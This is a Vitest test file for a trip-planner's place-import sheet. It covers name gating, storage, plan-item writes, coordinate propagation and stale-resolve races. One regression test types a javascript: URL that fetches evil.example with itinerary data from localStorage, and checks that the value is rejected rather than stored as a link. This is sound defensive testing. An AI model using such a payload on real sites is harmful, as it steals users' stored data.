// @vitest-environment jsdom
//
// S284 — the ImportPlaceSheet manual flow (`components/import-place-sheet.tsx`), rendered via the
// same act/createRoot shim as the hook tests (no @testing-library dep). framer-motion + sonner are
// mocked to plain passthroughs; `useItineraryContext` is mocked so we can assert the "also add to
// plan" write; `useMyPlaces` is REAL so we prove the place is actually persisted. Covers:
//   - the name-required confirm gate (D-074),
//   - confirm writes the MyPlace through the gateway,
//   - "also add to plan" writes a plan item stamped `sourceId: 'myplace-<id>'`, sourceType
//     'recommendation' (the vault enum is untouched).

import { describe, it, expect, beforeEach, vi } from 'vitest';
import { createElement } from 'react';
import { createRoot } from 'react-dom/client';
import { act } from 'react-dom/test-utils';
import { TRIP_DATES } from '@/core/dates';

const { addItemSpy, resolvePlaceLinkMock } = vi.hoisted(() => ({
  addItemSpy: vi.fn(),
  resolvePlaceLinkMock: vi.fn(),
}));

vi.mock('sonner', () => ({ toast: { success: vi.fn(), error: vi.fn() } }));

vi.mock('@/components/itinerary-provider', () => ({
  useItineraryContext: () => ({ addItem: addItemSpy, findPlacements: () => [] }),
}));

// S349 — the resolve client is mocked so we control exactly what "found" returns (with or
// without coordinates) without touching the network layer already covered by place-resolve.test.ts.
vi.mock('@/lib/place-resolve', () => ({
  resolvePlaceLink: resolvePlaceLinkMock,
}));

vi.mock('framer-motion', async () => {
  const React = await import('react');
  // eslint-disable-next-line @typescript-eslint/no-explicit-any
  const strip = (p: any) => {
    const { initial, animate, exit, whileHover, whileInView, whileTap, viewport, transition, layout, ...rest } = p;
    return rest;
  };
  return {
    // eslint-disable-next-line @typescript-eslint/no-explicit-any
    m: { div: (props: any) => React.createElement('div', strip(props)) },
    // eslint-disable-next-line @typescript-eslint/no-explicit-any
    AnimatePresence: ({ children }: any) => children,
    useReducedMotion: () => false,
  };
});

// Imported AFTER the mocks are registered.
import ImportPlaceSheet from '@/components/import-place-sheet';

const MY_PLACES_KEY = 'nepal_japan_my_places';

function q(testId: string): HTMLElement {
  const el = document.body.querySelector<HTMLElement>(`[data-testid="${testId}"]`);
  if (!el) throw new Error(`missing [data-testid="${testId}"]`);
  return el;
}

function setInput(el: HTMLElement, value: string): void {
  const proto = Object.getPrototypeOf(el);
  const desc =
    Object.getOwnPropertyDescriptor(proto, 'value') ??
    Object.getOwnPropertyDescriptor(HTMLInputElement.prototype, 'value')!;
  desc.set!.call(el, value);
  el.dispatchEvent(new Event('input', { bubbles: true }));
}

function pressEnter(el: HTMLElement): void {
  el.dispatchEvent(new KeyboardEvent('keydown', { key: 'Enter', bubbles: true }));
}

function renderSheet() {
  const container = document.createElement('div');
  document.body.appendChild(container);
  const root = createRoot(container);
  act(() => {
    root.render(createElement(ImportPlaceSheet, { open: true, urlEditable: true, onClose: () => {} }));
  });
  return {
    unmount() {
      act(() => root.unmount());
      container.remove();
    },
  };
}

// Flush the resolve promise's microtask chain + the resulting React state updates (same idiom as
// lib/__tests__/s346-audit.test.ts's flush()).
async function flush(): Promise<void> {
  await act(async () => {
    await new Promise((r) => setTimeout(r, 0));
  });
}

describe('ImportPlaceSheet (S284) — manual flow', () => {
  beforeEach(() => {
    localStorage.clear();
    addItemSpy.mockReset();
    resolvePlaceLinkMock.mockReset();
  });

  it('gates confirm on a non-empty name (D-074)', () => {
    const h = renderSheet();
    expect((q('import-place-confirm') as HTMLButtonElement).disabled).toBe(true);
    act(() => setInput(q('import-place-name-input'), 'My Spot'));
    expect((q('import-place-confirm') as HTMLButtonElement).disabled).toBe(false);
    h.unmount();
  });

  it('confirm writes the MyPlace to the gateway slot (default leg preselected)', () => {
    const h = renderSheet();
    act(() => setInput(q('import-place-name-input'), 'Boudhanath'));
    act(() => q('import-place-confirm').click());
    const stored = JSON.parse(localStorage.getItem(MY_PLACES_KEY) as string);
    expect(stored).toHaveLength(1);
    expect(stored[0].name).toBe('Boudhanath');
    expect(stored[0].legId).toBe('nepal'); // default pack, first leg
    expect(addItemSpy).not.toHaveBeenCalled(); // plan section collapsed → no plan item
    h.unmount();
  });

  it('a javascript: url typed into the field is NOT stored as sourceUrl (an https one still is)', () => {
    // Save was never gated on `isGooglePlaceUrl` — manual entry is the point — so whatever was
    // typed went to storage verbatim and straight into `<a href>` on the place card. Places SYNC,
    // so that anchor also appears on the other member's device, on an origin with no CSP.
    const h = renderSheet();
    act(() => setInput(q('import-place-url-input'), "javascript:fetch('https://evil.example/?'+localStorage.getItem('nepal_japan_itinerary'))"));
    act(() => setInput(q('import-place-name-input'), 'Totally normal spot'));
    act(() => q('import-place-confirm').click());
    const stored = JSON.parse(localStorage.getItem(MY_PLACES_KEY) as string);
    expect(stored[0].name).toBe('Totally normal spot');
    expect(stored[0].sourceUrl).toBeUndefined();
    h.unmount();
  });

  it('an ordinary https url IS still stored as sourceUrl (the allow-list was not widened or narrowed)', () => {
    const h = renderSheet();
    act(() => setInput(q('import-place-url-input'), 'https://maps.app.goo.gl/abc'));
    act(() => setInput(q('import-place-name-input'), 'Boudhanath'));
    act(() => q('import-place-confirm').click());
    expect(JSON.parse(localStorage.getItem(MY_PLACES_KEY) as string)[0].sourceUrl).toBe('https://maps.app.goo.gl/abc');
    h.unmount();
  });

  it('"also add to plan" writes a plan item with a myplace- sourceId', () => {
    const h = renderSheet();
    act(() => setInput(q('import-place-name-input'), 'Ramen Nagi'));
    act(() => q('import-place-toggle-plan').click()); // expand the collapsed section
    act(() => q('import-place-confirm').click());
    // The place is still written...
    const stored = JSON.parse(localStorage.getItem(MY_PLACES_KEY) as string);
    expect(stored[0].name).toBe('Ramen Nagi');
    // ...AND a plan item is added on the default (first) trip day.
    expect(addItemSpy).toHaveBeenCalledTimes(1);
    const [date, item] = addItemSpy.mock.calls[0];
    expect(date).toBe(TRIP_DATES[0]);
    expect(item.title).toBe('Ramen Nagi');
    expect(item.sourceType).toBe('recommendation');
    expect(item.sourceId).toMatch(/^myplace-/);
    // the plan item's sourceId references the freshly-written place id
    expect(item.sourceId).toBe(`myplace-${stored[0].id}`);
    h.unmount();
  });
});

describe('ImportPlaceSheet (S349) — resolved coordinates reach the plan item (the actual pin-drop bug)', () => {
  beforeEach(() => {
    localStorage.clear();
    addItemSpy.mockReset();
    resolvePlaceLinkMock.mockReset();
  });

  it('a resolve that returns lat/lng carries lat/lng on the addItem() payload', async () => {
    resolvePlaceLinkMock.mockResolvedValueOnce({
      finalUrl: 'https://www.google.com/maps/place/Fushimi+Inari/@34.9671,135.7727,17z',
      name: 'Fushimi Inari',
      lat: 34.9671,
      lng: 135.7727,
    });
    const h = renderSheet();
    act(() => setInput(q('import-place-url-input'), 'https://maps.app.goo.gl/xyz'));
    act(() => q('import-place-lookup').click());
    await flush();

    // The name pre-filled from the resolve (proves the mock actually ran).
    expect((q('import-place-name-input') as HTMLInputElement).value).toBe('Fushimi Inari');

    act(() => q('import-place-toggle-plan').click());
    act(() => q('import-place-confirm').click());

    expect(addItemSpy).toHaveBeenCalledTimes(1);
    const [, item] = addItemSpy.mock.calls[0];
    // This is the S349 bug: before the fix, lat/lng were resolved into local state but never
    // reached this payload, so stopMarkerFor() had nothing to plot.
    expect(item.lat).toBe(34.9671);
    expect(item.lng).toBe(135.7727);
    h.unmount();
  });

  it('a resolve that returns a name with NO coordinates (the share.google shape, D-243 amendment) omits lat/lng rather than writing NaN/undefined-as-string', async () => {
    resolvePlaceLinkMock.mockResolvedValueOnce({
      finalUrl: 'https://www.google.com/search?q=Arashiyama+Bamboo+Grove',
      name: 'Arashiyama Bamboo Grove',
    });
    const h = renderSheet();
    act(() => setInput(q('import-place-url-input'), 'https://maps.app.goo.gl/xyz'));
    act(() => q('import-place-lookup').click());
    await flush();

    expect((q('import-place-name-input') as HTMLInputElement).value).toBe('Arashiyama Bamboo Grove');
    act(() => q('import-place-toggle-plan').click());
    act(() => q('import-place-confirm').click());

    expect(addItemSpy).toHaveBeenCalledTimes(1);
    const [, item] = addItemSpy.mock.calls[0];
    expect(item.lat).toBeUndefined();
    expect(item.lng).toBeUndefined();
    h.unmount();
  });

  it('a stale resolve never overwrites the newer one, and a late failure never wipes it', async () => {
    // REACT-3 — `runResolve` has three call sites (auto-resolve on open, Enter in the URL field,
    // the "Look up" button) and only the button is gated on `status === 'resolving'`, so two
    // resolves overlap easily. Without the generation guard they applied in COMPLETION order: B's
    // url sat beside A's name, and A's `null` (any failure) reset a newer success to 'notfound'.
    let failA: (v: null) => void = () => {};
    resolvePlaceLinkMock
      .mockReturnValueOnce(new Promise<null>((r) => { failA = r; })) // link A — resolves LAST
      .mockResolvedValueOnce({ name: 'Fushimi Inari', finalUrl: 'https://www.google.com/maps/place/Fushimi' });

    // Both triggers are Enter, the ungated one: "Look up" disables itself while `status` is
    // 'resolving', which is exactly why the keydown path is the one that overlaps in practice.
    const h = renderSheet();
    act(() => setInput(q('import-place-url-input'), 'https://maps.app.goo.gl/AAA'));
    act(() => pressEnter(q('import-place-url-input'))); // resolve A starts, still pending
    act(() => setInput(q('import-place-url-input'), 'https://maps.app.goo.gl/BBB'));
    act(() => pressEnter(q('import-place-url-input'))); // resolve B starts
    await flush();
    expect((q('import-place-name-input') as HTMLInputElement).value).toBe('Fushimi Inari');

    act(() => failA(null)); // A finally answers — and must be ignored entirely
    await flush();

    expect((q('import-place-name-input') as HTMLInputElement).value).toBe('Fushimi Inari');
    expect(q('import-place-status').textContent).toContain('Found this place');
    h.unmount();
  });

  it('manual entry (no resolve) still omits lat/lng — never regresses to writing a phantom pin', () => {
    const h = renderSheet();
    act(() => setInput(q('import-place-name-input'), 'Hand-typed spot'));
    act(() => q('import-place-toggle-plan').click());
    act(() => q('import-place-confirm').click());
    expect(addItemSpy).toHaveBeenCalledTimes(1);
    const [, item] = addItemSpy.mock.calls[0];
    expect(item.lat).toBeUndefined();
    expect(item.lng).toBeUndefined();
    expect(resolvePlaceLinkMock).not.toHaveBeenCalled();
    h.unmount();
  });
});
